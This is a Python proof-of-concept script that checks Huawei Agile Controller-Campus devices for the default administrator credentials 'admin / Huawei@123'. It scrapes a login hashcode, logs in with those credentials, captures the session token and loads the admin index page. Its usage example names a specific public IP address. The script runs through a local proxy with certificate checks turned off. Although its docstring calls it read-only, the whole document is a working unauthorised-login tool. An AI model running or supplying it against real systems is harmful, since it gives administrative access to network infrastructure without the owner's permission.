# -*- coding: utf-8 -*-
"""华为 Agile Controller-Campus 弱口令只读验证 POC（admin / Huawei@123）
用法: python verify_agile_weakpwd.py <base_url>
示例: python verify_agile_weakpwd.py https://183.136.145.78:10000
只读验证：仅登录并读取登录后主页面确认身份，不执行任何写操作。
"""
import requests, urllib3, re, sys
urllib3.disable_warnings()
P = {"http": "http://127.0.0.1:7897", "https": "http://127.0.0.1:7897"}

def main(base):
    s = requests.Session(); s.proxies = P; s.verify = False
    r = s.get(base + "/OPMUI/login.html", timeout=20)
    h = re.search(r'id="hashcode"[^>]*value="([^"]+)"', r.text).group(1)
    r2 = s.post(base + "/OPMUI/business/tsmLogin!login.action",
                data={"userName": "admin", "password": "Huawei@123",
                      "hashcode": h, "validCode": ""},
                timeout=20, headers={"Referer": base + "/OPMUI/login.html"})
    j = r2.json()
    if j.get("message") is None and j.get("data"):
        s.cookies.set("XSRF-TOKEN", j["data"], path="/")
        r3 = s.get(base + "/OPMUI/jsp/secospace/index.jsp", timeout=20)
        ok = r3.status_code == 200 and "系统管理" in r3.text
        print({"vulnerable": ok, "user": "admin",
               "token": j["data"][:12] + "...", "index_len": len(r3.text)})
    else:
        print({"vulnerable": False, "message": j.get("message")})

if __name__ == "__main__":
    main(sys.argv[1])
